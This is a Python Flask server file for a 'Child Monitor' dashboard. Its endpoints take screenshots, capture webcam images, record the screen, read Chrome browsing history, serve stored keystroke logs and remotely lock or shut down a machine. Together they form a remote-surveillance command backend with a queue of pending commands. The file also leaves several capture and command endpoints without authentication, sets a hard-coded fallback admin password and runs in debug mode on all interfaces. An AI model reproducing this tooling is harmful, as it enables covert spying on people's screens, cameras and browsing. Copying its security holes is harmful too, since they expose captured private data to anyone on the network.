"""
FLASK BACKEND SERVER - Handles web requests and MongoDB operations
"""
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, render_template_string
from pymongo import MongoClient
from datetime import datetime
import os
from dotenv import load_dotenv
import psutil
import platform
import socket
import pyautogui
import cv2
import mss
import time
import threading
import base64
from io import BytesIO
from PIL import Image
import numpy as np
import imageio
import sqlite3
from bson import ObjectId
import secrets
from functools import wraps

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# ⚠️ Load from .env file ⚠️
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'YourSecurePassword123')

# Secret key for sessions
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))

# MongoDB Connection from .env
MONGO_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
DB_NAME = "child_monitoring"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]

# Collections
devices_col = db["devices"]  # Store connected devices
commands_col = db["commands"]  # Store commands to execute
results_col = db["results"]  # Store command results
keystrokes_col = db["keystrokes"]  # Store keystroke logs
screenshots_col = db["screenshots"]  # Store screenshots

# Global variables
keylogger_running = False
captured_text = ""

# ==================== LOGIN SYSTEM ====================

def login_required(f):
    """Decorator to check if user is logged in"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Skip login for login endpoints and API calls from authenticated clients
        if 'user_id' not in session and request.method == 'GET':
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated_function

@app.before_request
def check_logged_in():
    """Check if user is logged in for protected routes"""
    protected_routes = ['/', '/api/devices', '/api/device', '/api/command']
    
    # Check if current route is protected
    is_protected = False
    for route in protected_routes:
        if request.path.startswith(route) and request.path not in ['/login', '/api/login']:
            is_protected = True
            break
    
    # If protected route and not logged in, redirect to login
    if is_protected and 'user_id' not in session:
        if request.path.startswith('/api/'):
            return jsonify({"error": "Not authenticated"}), 401
        return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        if password == ADMIN_PASSWORD:
            session['user_id'] = 'admin'
            session['login_time'] = datetime.now().isoformat()
            return redirect('/')
        else:
            return render_template_string(LOGIN_HTML, error="❌ Wrong password! Try again.")
    
    return render_template_string(LOGIN_HTML, error="")

@app.route('/logout')
def logout():
    """Logout user"""
    session.clear()
    return redirect('/login')

# HTML for login page
LOGIN_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Child Monitor - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .login-container {
            background: white;
            padding: 50px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
            font-size: 28px;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .error {
            background: #fee2e2;
            color: #991b1b;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #ef4444;
            text-align: center;
        }
        
        .info {
            background: #dbeafe;
            color: #1e3a8a;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #3b82f6;
            font-size: 13px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>👶 Child Monitor</h1>
        <p class="subtitle">Parental Control System</p>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <div class="info">
            🔒 <strong>Enter your password to access the monitoring dashboard.</strong>
        </div>
        
        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input 
                    type="password" 
                    name="password" 
                    id="password" 
                    placeholder="Enter your password"
                    autofocus
                    required
                >
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

# ==================== UTILITY FUNCTIONS ====================

def get_pc_info():
    """Fetch system information"""
    uname = platform.uname()
    cpu_usage = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    ip_address = socket.gethostbyname(socket.gethostname())

    pc_info = {
        "system": f"{uname.system} {uname.release}",
        "machine": uname.machine,
        "processor": uname.processor,
        "cpu_usage": cpu_usage,
        "ram_used": ram.used // (1024 ** 2),
        "ram_total": ram.total // (1024 ** 2),
        "disk_used": disk.used // (1024 ** 3),
        "disk_total": disk.total // (1024 ** 3),
        "ip_address": ip_address
    }
    return pc_info

def store_command(device_id, command, params=None):
    """Store command in MongoDB for client to fetch"""
    command_doc = {
        "device_id": device_id,
        "command": command,
        "params": params or {},
        "created_at": datetime.now(),
        "status": "pending",
        "executed": False
    }
    result = commands_col.insert_one(command_doc)
    return str(result.inserted_id)

def store_result(device_id, command_id, result_data, success=True):
    """Store command result in MongoDB"""
    result_doc = {
        "device_id": device_id,
        "command_id": command_id,
        "result": result_data,
        "success": success,
        "created_at": datetime.now()
    }
    results_col.insert_one(result_doc)

# ==================== API ENDPOINTS ====================

@app.route('/')
@login_required
def index():
    """Serve the dashboard"""
    return render_template('index.html')

@app.route('/api/register-device', methods=['POST'])
def register_device():
    """Register a new monitoring device"""
    data = request.json
    device_doc = {
        "device_name": data.get('device_name', 'Unknown'),
        "device_id": data.get('device_id', socket.gethostname()),
        "status": "online",
        "registered_at": datetime.now(),
        "last_seen": datetime.now(),
        "pc_info": get_pc_info()
    }
    
    # Check if device already exists, update if yes
    existing = devices_col.find_one({"device_id": device_doc["device_id"]})
    if existing:
        devices_col.update_one({"device_id": device_doc["device_id"]}, {"$set": device_doc})
        return jsonify({"status": "updated", "device_id": device_doc["device_id"]})
    
    result = devices_col.insert_one(device_doc)
    return jsonify({"status": "registered", "device_id": str(result.inserted_id)})

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """Get all registered devices"""
    devices = list(devices_col.find({}, {"_id": 1, "device_id": 1, "device_name": 1, "status": 1, "last_seen": 1}))
    for device in devices:
        device["_id"] = str(device["_id"])
    return jsonify(devices)

@app.route('/api/device/<device_id>', methods=['GET'])
def get_device(device_id):
    """Get specific device info"""
    device = devices_col.find_one({"device_id": device_id})
    if not device:
        return jsonify({"error": "Device not found"}), 404
    
    device["_id"] = str(device["_id"])
    return jsonify(device)

# ==================== COMMAND ENDPOINTS ====================

@app.route('/api/command/pcinfo', methods=['POST'])
def cmd_pcinfo():
    """Get PC information"""
    data = request.json
    device_id = data.get('device_id')
    
    pc_info = get_pc_info()
    command_id = store_command(device_id, "pcinfo")
    store_result(device_id, command_id, pc_info)
    
    return jsonify({"status": "success", "data": pc_info})

@app.route('/api/command/lock', methods=['POST'])
def cmd_lock():
    """Lock PC"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "lock")
    try:
        os.system("rundll32.exe user32.dll,LockWorkStation")
        store_result(device_id, command_id, "PC locked successfully")
        return jsonify({"status": "success", "message": "PC locked"})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/shutdown', methods=['POST'])
def cmd_shutdown():
    """Shutdown PC"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "shutdown")
    try:
        os.system("shutdown /s /t 10")
        store_result(device_id, command_id, "Shutdown initiated")
        return jsonify({"status": "success", "message": "Shutdown initiated"})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/restart', methods=['POST'])
def cmd_restart():
    """Restart PC"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "restart")
    try:
        os.system("shutdown /r /t 10")
        store_result(device_id, command_id, "Restart initiated")
        return jsonify({"status": "success", "message": "Restart initiated"})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/logout', methods=['POST'])
def cmd_logout():
    """Logout user"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "logout")
    try:
        os.system("shutdown -l")
        store_result(device_id, command_id, "Logout initiated")
        return jsonify({"status": "success", "message": "Logout initiated"})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/screenshot', methods=['POST'])
def cmd_screenshot():
    """Take screenshot"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "screenshot")
    try:
        screenshot = pyautogui.screenshot()
        
        # Convert to base64 for storage
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        img_base64 = base64.b64encode(img_byte_arr).decode('utf-8')
        
        # Store screenshot in MongoDB
        screenshot_doc = {
            "device_id": device_id,
            "command_id": command_id,
            "image_base64": img_base64,
            "created_at": datetime.now()
        }
        screenshots_col.insert_one(screenshot_doc)
        
        store_result(device_id, command_id, "Screenshot captured")
        
        return jsonify({"status": "success", "image": img_base64})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/webcam', methods=['POST'])
def cmd_webcam():
    """Capture webcam image"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "webcam")
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Convert BGR to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Convert to base64
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
            
            store_result(device_id, command_id, "Webcam captured")
            
            return jsonify({"status": "success", "image": img_base64})
        else:
            store_result(device_id, command_id, "Unable to capture webcam", success=False)
            return jsonify({"status": "error", "message": "Unable to capture webcam"}), 400
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/chromehistory', methods=['POST'])
def cmd_chrome_history():
    """Get Chrome browsing history"""
    data = request.json
    device_id = data.get('device_id')
    
    command_id = store_command(device_id, "chromehistory")
    try:
        chrome_history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        temp_history_db = "temp_chrome_history.db"
        
        # Copy the locked DB file
        os.system(f'copy "{chrome_history_path}" "{temp_history_db}"')
        
        conn = sqlite3.connect(temp_history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20")
        history = cursor.fetchall()
        conn.close()
        os.remove(temp_history_db)
        
        history_list = [{"url": url, "title": title} for url, title in history]
        store_result(device_id, command_id, history_list)
        
        return jsonify({"status": "success", "history": history_list})
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/command/record', methods=['POST'])
def cmd_record():
    """Record screen"""
    data = request.json
    device_id = data.get('device_id')
    duration = data.get('duration', 10)
    
    command_id = store_command(device_id, "record", {"duration": duration})
    try:
        frames = []
        with mss.mss() as sct:
            start_time = time.time()
            while time.time() - start_time < duration:
                screenshot = sct.grab(sct.monitors[1])
                frame = np.array(screenshot)
                frames.append(frame)
                time.sleep(0.1)
        
        output = "screen_record.mp4"
        imageio.mimsave(output, frames, fps=10)
        
        store_result(device_id, command_id, f"Screen recorded for {duration} seconds")
        
        return send_file(output, mimetype='video/mp4', as_attachment=True)
    except Exception as e:
        store_result(device_id, command_id, str(e), success=False)
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/keystrokes/<device_id>', methods=['GET'])
def get_keystrokes(device_id):
    """Get keystroke logs"""
    logs = list(keystrokes_col.find(
        {"device_id": device_id},
        sort=[("created_at", -1)],
        limit=100
    ))
    
    for log in logs:
        log["_id"] = str(log["_id"])
        log["created_at"] = str(log["created_at"])
    
    return jsonify(logs)

@app.route('/api/screenshots/<device_id>', methods=['GET'])
def get_screenshots(device_id):
    """Get stored screenshots"""
    screenshots = list(screenshots_col.find(
        {"device_id": device_id},
        sort=[("created_at", -1)],
        limit=20
    ))
    
    for ss in screenshots:
        ss["_id"] = str(ss["_id"])
        ss["created_at"] = str(ss["created_at"])
    
    return jsonify(screenshots)

@app.route('/api/commands/pending/<device_id>', methods=['GET'])
def get_pending_commands(device_id):
    """Get pending commands for client"""
    commands = list(commands_col.find(
        {"device_id": device_id, "executed": False}
    ))
    
    for cmd in commands:
        cmd["_id"] = str(cmd["_id"])
    
    return jsonify(commands)

@app.route('/api/command/executed/<command_id>', methods=['POST'])
def mark_executed(command_id):
    """Mark command as executed"""
    commands_col.update_one(
        {"_id": ObjectId(command_id)},
        {"$set": {"executed": True, "status": "completed"}}
    )
    return jsonify({"status": "marked as executed"})

if __name__ == '__main__':
    # Create indexes for better performance
    devices_col.create_index("device_id", unique=True)
    commands_col.create_index("device_id")
    results_col.create_index("device_id")
    keystrokes_col.create_index("device_id")
    screenshots_col.create_index("device_id")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
